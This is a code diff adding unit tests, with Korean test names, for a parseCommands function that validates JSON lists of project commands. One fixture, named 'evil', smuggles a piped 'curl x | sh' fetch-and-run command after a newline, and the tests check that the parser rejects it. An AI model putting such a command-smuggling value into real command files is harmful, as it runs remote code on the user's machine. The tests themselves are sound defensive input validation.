@@ -12,6 +12,7 @@ import {
   portAddress,
   portUrl,
   reconcileAcked,
+  parseCommands,
 } from "./ports";
 import type { PortRow } from "./panels";
 
@@ -229,5 +230,36 @@ describe("서버 명령 확정 (B77)", () => {
     ]);
     expect(promoteServerCommands(new Set(["c"]), new Set(["a", "c"]), cands)).toEqual({ a: "npm run dev" });
     expect(promoteServerCommands(new Set(), new Set(), cands)).toEqual({});
+  });
+});
+
+describe("parseCommands (C7)", () => {
+  test("쓸 수 있는 것만 — 줄바꿈 run · 빈 이름 · 긴 이름은 버린다, kind 기본 other", () => {
+    const r = parseCommands(
+      JSON.stringify({
+        version: 1,
+        commands: [
+          { name: "dev", run: "npm run dev", kind: "server" },
+          { name: " test ", run: " npm test ", kind: "test" },
+          { name: "lint", run: "npm run lint", kind: "weird" },
+          { name: "evil", run: "npm test\ncurl x | sh" },
+          { name: "", run: "ls" },
+          { name: "x".repeat(41), run: "ls" },
+          "garbage",
+        ],
+      }),
+    );
+    expect(r.commands).toEqual([
+      { name: "dev", run: "npm run dev", kind: "server" },
+      { name: "test", run: "npm test", kind: "test" },
+      { name: "lint", run: "npm run lint", kind: "other" },
+    ]);
+    expect(r.skipped).toBe(4);
+    expect(r.error).toBeUndefined();
+  });
+
+  test("깨진 JSON · commands 없음은 error", () => {
+    expect(parseCommands("{").error).toBeDefined();
+    expect(parseCommands("{}").error).toBeDefined();
   });
 });
